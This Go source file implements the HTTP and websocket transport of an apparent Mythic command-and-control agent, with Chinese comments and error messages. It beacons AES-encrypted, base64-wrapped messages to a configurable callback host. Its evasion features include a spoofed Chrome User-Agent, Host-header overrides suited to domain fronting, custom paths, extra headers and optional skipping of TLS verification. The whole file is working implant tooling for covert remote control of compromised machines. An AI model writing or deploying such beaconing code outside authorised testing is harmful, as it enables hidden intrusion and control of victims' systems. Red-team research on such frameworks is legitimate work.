package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type httpTransport struct {
	client *http.Client
	url    string
	host   string
	header http.Header
}

func newHTTPTransport(profile EmbeddedProfile, insecureSkipVerify bool) (*httpTransport, error) {
	requestURL, hostHeader, masqueradeHeaders, err := buildHTTPAgentMessageURL(profile)
	if err != nil {
		return nil, err
	}
	transport := &http.Transport{}
	if strings.HasPrefix(strings.ToLower(strings.TrimSpace(requestURL)), "https://") {
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: insecureSkipVerify}
	}
	return &httpTransport{
		client: &http.Client{
			Timeout:   30 * time.Second,
			Transport: transport,
		},
		url:    requestURL,
		host:   hostHeader,
		header: masqueradeHeaders,
	}, nil
}

func (t *httpTransport) Send(uuid string, data interface{}, aesKey []byte) ([]byte, error) {
	encoded, err := marshalOutboundEnvelope(uuid, data, aesKey)
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest("POST", t.url, bytes.NewBufferString(encoded))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Mythic", "http")
	applyHeaderValues(req.Header, t.header)
	if t.host != "" {
		req.Host = t.host
	}
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("HTTP 请求失败: %w", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("读取响应失败: %w", err)
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("服务器返回异常状态码: %d, body=%s", resp.StatusCode, string(body))
	}
	return decodeInboundEnvelope(body, aesKey)
}

func (t *httpTransport) Close() error {
	return nil
}

type websocketTransport struct {
	conn *websocket.Conn

	mu          sync.Mutex
	pushStarted bool
	pushAESKey  []byte
	outgoing    chan websocketEnvelope
	incoming    chan []byte
	errCh       chan error
	done        chan struct{}
	closeOnce   sync.Once
}

// websocketEnvelope 对齐官方 websocket profile 的轻量包装格式。
// 当前实现假设 Agent 作为 client 一侧，真实数据放在 data 字段里。
type websocketEnvelope struct {
	Client bool   `json:"client"`
	Data   string `json:"data"`
	Tag    string `json:"tag,omitempty"`
}

func newWebsocketTransport(profile EmbeddedProfile, insecureSkipVerify bool) (*websocketTransport, error) {
	targetURL, requestHeaders, err := buildWebsocketURL(profile)
	if err != nil {
		return nil, err
	}
	dialer := websocket.Dialer{
		HandshakeTimeout: 15 * time.Second,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: insecureSkipVerify},
	}
	conn, _, err := dialer.Dial(targetURL, requestHeaders)
	if err != nil {
		return nil, fmt.Errorf("建立 websocket 连接失败: %w", err)
	}
	return &websocketTransport{
		conn:     conn,
		outgoing: make(chan websocketEnvelope, 256),
		incoming: make(chan []byte, 256),
		errCh:    make(chan error, 8),
		done:     make(chan struct{}),
	}, nil
}

func (t *websocketTransport) Send(uuid string, data interface{}, aesKey []byte) ([]byte, error) {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.pushStarted {
		return nil, fmt.Errorf("push session 已启动，不能继续使用同步 Send")
	}
	encoded, err := marshalOutboundEnvelope(uuid, data, aesKey)
	if err != nil {
		return nil, err
	}
	if err := t.conn.WriteJSON(websocketEnvelope{Client: true, Data: encoded}); err != nil {
		return nil, fmt.Errorf("发送 websocket 数据失败: %w", err)
	}
	var resp websocketEnvelope
	if err := t.conn.ReadJSON(&resp); err != nil {
		return nil, fmt.Errorf("读取 websocket 响应失败: %w", err)
	}
	if strings.TrimSpace(resp.Data) == "" {
		return nil, fmt.Errorf("收到空 websocket 响应")
	}
	return decodeInboundEnvelope([]byte(resp.Data), aesKey)
}

func (t *websocketTransport) StartPushPump(aesKey []byte) error {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.pushStarted {
		return nil
	}
	t.pushStarted = true
	t.pushAESKey = append([]byte(nil), aesKey...)
	go t.readLoop()
	go t.writeLoop()
	return nil
}

func (t *websocketTransport) SendPush(uuid string, data interface{}, aesKey []byte) error {
	t.mu.Lock()
	pushStarted := t.pushStarted
	t.mu.Unlock()
	if !pushStarted {
		return fmt.Errorf("push session 尚未启动")
	}
	encoded, err := marshalOutboundEnvelope(uuid, data, aesKey)
	if err != nil {
		return err
	}
	select {
	case <-t.done:
		return fmt.Errorf("websocket 连接已关闭")
	case t.outgoing <- websocketEnvelope{Client: true, Data: encoded}:
		return nil
	}
}

func (t *websocketTransport) Incoming() <-chan []byte {
	return t.incoming
}

func (t *websocketTransport) Errors() <-chan error {
	return t.errCh
}

func (t *websocketTransport) Close() error {
	t.shutdown(nil)
	return nil
}

func (t *websocketTransport) readLoop() {
	for {
		var resp websocketEnvelope
		if err := t.conn.ReadJSON(&resp); err != nil {
			t.shutdown(fmt.Errorf("读取 websocket push 数据失败: %w", err))
			return
		}
		if strings.TrimSpace(resp.Data) == "" {
			continue
		}
		decoded, err := decodeInboundEnvelope([]byte(resp.Data), t.pushAESKey)
		if err != nil {
			t.shutdown(fmt.Errorf("解码 websocket push 数据失败: %w", err))
			return
		}
		select {
		case <-t.done:
			return
		case t.incoming <- decoded:
		}
	}
}

func (t *websocketTransport) writeLoop() {
	for {
		select {
		case <-t.done:
			return
		case message := <-t.outgoing:
			if err := t.conn.WriteJSON(message); err != nil {
				t.shutdown(fmt.Errorf("发送 websocket push 数据失败: %w", err))
				return
			}
		}
	}
}

func (t *websocketTransport) shutdown(err error) {
	t.closeOnce.Do(func() {
		if err != nil {
			select {
			case t.errCh <- err:
			default:
			}
		}
		close(t.done)
		_ = t.conn.Close()
	})
}

func buildHTTPAgentMessageURL(profile EmbeddedProfile) (string, string, http.Header, error) {
	hostInput := strings.TrimSpace(profile.CallbackHost)
	portInput := strings.TrimSpace(profile.CallbackPort)
	if hostInput == "" {
		return "", "", nil, fmt.Errorf("callback_host 为空")
	}
	if !strings.HasPrefix(hostInput, "http://") && !strings.HasPrefix(hostInput, "https://") {
		hostInput = "http://" + hostInput
	}
	parsed, err := url.Parse(hostInput)
	if err != nil {
		return "", "", nil, fmt.Errorf("callback_host 无法解析: %w", err)
	}
	if parsed.Host == "" {
		return "", "", nil, fmt.Errorf("callback_host 无效: %s", profile.CallbackHost)
	}
	if portInput != "" {
		parsed.Host = net.JoinHostPort(parsed.Hostname(), portInput)
	}
	settings := extractMasqueradeSettings(profile, false)
	parsed.Path = settings.Path
	parsed.RawQuery = settings.QueryString
	return parsed.String(), settings.HostHeader, settings.Headers, nil
}

func buildWebsocketURL(profile EmbeddedProfile) (string, http.Header, error) {
	hostInput := strings.TrimSpace(profile.CallbackHost)
	portInput := strings.TrimSpace(profile.CallbackPort)
	if hostInput == "" {
		return "", nil, fmt.Errorf("websocket callback_host 为空")
	}
	switch {
	case strings.HasPrefix(strings.ToLower(hostInput), "ws://"), strings.HasPrefix(strings.ToLower(hostInput), "wss://"):
	case strings.HasPrefix(strings.ToLower(hostInput), "http://"):
		hostInput = "ws://" + strings.TrimPrefix(hostInput, "http://")
	case strings.HasPrefix(strings.ToLower(hostInput), "https://"):
		hostInput = "wss://" + strings.TrimPrefix(hostInput, "https://")
	default:
		hostInput = "ws://" + hostInput
	}
	parsed, err := url.Parse(hostInput)
	if err != nil {
		return "", nil, fmt.Errorf("websocket callback_host 无法解析: %w", err)
	}
	if parsed.Host == "" {
		return "", nil, fmt.Errorf("websocket callback_host 无效: %s", profile.CallbackHost)
	}
	if portInput != "" {
		parsed.Host = net.JoinHostPort(parsed.Hostname(), portInput)
	}
	settings := extractMasqueradeSettings(profile, true)
	parsed.Path = settings.Path
	parsed.RawQuery = settings.QueryString
	requestHeaders := cloneHeaders(settings.Headers)
	if settings.HostHeader != "" {
		requestHeaders.Set("Host", settings.HostHeader)
	}
	return parsed.String(), requestHeaders, nil
}

func marshalOutboundEnvelope(uuid string, data interface{}, aesKey []byte) (string, error) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return "", fmt.Errorf("JSON 序列化失败: %w", err)
	}
	var message []byte
	if len(aesKey) > 0 {
		// 有 AESPSK 时走 Mythic 标准 UUID + EncBlob 格式。
		encrypted, err := aes256Encrypt(jsonData, aesKey)
		if err != nil {
			return "", fmt.Errorf("加密失败: %w", err)
		}
		message = append([]byte(uuid), encrypted...)
	} else {
		message = []byte(uuid + string(jsonData))
	}
	return base64.StdEncoding.EncodeToString(message), nil
}

func decodeInboundEnvelope(body []byte, aesKey []byte) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		return nil, fmt.Errorf("Base64 解码失败: %w", err)
	}
	if len(decoded) < 36 {
		return nil, fmt.Errorf("响应太短: 期望至少36字节，实际%d字节", len(decoded))
	}
	if _, payload, err := splitMythicEnvelope(decoded); err != nil {
		return nil, err
	} else {
		decoded = payload
	}
	if len(aesKey) > 0 {
		jsonResp, err := aes256Decrypt(decoded, aesKey)
		if err != nil {
			return nil, fmt.Errorf("解密响应失败: %w", err)
		}
		return jsonResp, nil
	}
	return decoded, nil
}

type masqueradeSettings struct {
	Path        string
	QueryString string
	HostHeader  string
	Headers     http.Header
}

func extractMasqueradeSettings(profile EmbeddedProfile, websocketMode bool) masqueradeSettings {
	settings := masqueradeSettings{
		Path:    "/agent_message",
		Headers: make(http.Header),
	}
	settingPathKey := "post_path"
	if websocketMode {
		settingPathKey = "websocket_path"
	}
	if pathValue, ok := profileParameterString(profile.Parameters, settingPathKey); ok && strings.TrimSpace(pathValue) != "" {
		settings.Path = normalizeTransportPath(pathValue)
	}
	if queryString, ok := profileParameterString(profile.Parameters, "query_string"); ok {
		settings.QueryString = strings.TrimSpace(strings.TrimPrefix(queryString, "?"))
	}
	if hostHeader, ok := profileParameterString(profile.Parameters, "host_header"); ok {
		settings.HostHeader = strings.TrimSpace(hostHeader)
	}
	if settings.HostHeader == "" {
		if parsed, err := url.Parse(strings.TrimSpace(profile.CallbackHost)); err == nil && parsed.Host != "" {
			settings.HostHeader = parsed.Host
		}
	}
	defaultUserAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
	settings.Headers.Set("User-Agent", defaultUserAgent)
	if userAgent, ok := profileParameterString(profile.Parameters, "user_agent"); ok && strings.TrimSpace(userAgent) != "" {
		settings.Headers.Set("User-Agent", strings.TrimSpace(userAgent))
	}
	if extraHeaders := profileParameterMap(profile.Parameters, "extra_headers"); len(extraHeaders) > 0 {
		for key, value := range extraHeaders {
			settings.Headers.Set(key, value)
		}
	}
	return settings
}

func normalizeTransportPath(pathValue string) string {
	trimmed := strings.TrimSpace(pathValue)
	if trimmed == "" {
		return "/agent_message"
	}
	if !strings.HasPrefix(trimmed, "/") {
		return "/" + trimmed
	}
	return trimmed
}

func profileParameterString(parameters map[string]interface{}, key string) (string, bool) {
	if parameters == nil {
		return "", false
	}
	value, ok := parameters[key]
	if !ok || value == nil {
		return "", false
	}
	switch typed := value.(type) {
	case string:
		return typed, true
	default:
		text := strings.TrimSpace(fmt.Sprintf("%v", typed))
		if text == "" || text == "<nil>" {
			return "", false
		}
		return text, true
	}
}

func profileParameterMap(parameters map[string]interface{}, key string) map[string]string {
	result := map[string]string{}
	if parameters == nil {
		return result
	}
	value, ok := parameters[key]
	if !ok || value == nil {
		return result
	}
	switch typed := value.(type) {
	case map[string]interface{}:
		for currentKey, currentValue := range typed {
			text := strings.TrimSpace(fmt.Sprintf("%v", currentValue))
			if text == "" || text == "<nil>" {
				continue
			}
			result[currentKey] = text
		}
	case map[string]string:
		for currentKey, currentValue := range typed {
			if strings.TrimSpace(currentValue) == "" {
				continue
			}
			result[currentKey] = strings.TrimSpace(currentValue)
		}
	}
	return result
}

func applyHeaderValues(target http.Header, values http.Header) {
	for key, entries := range values {
		target.Del(key)
		for _, value := range entries {
			target.Add(key, value)
		}
	}
}

func cloneHeaders(values http.Header) http.Header {
	cloned := make(http.Header)
	applyHeaderValues(cloned, values)
	return cloned
}
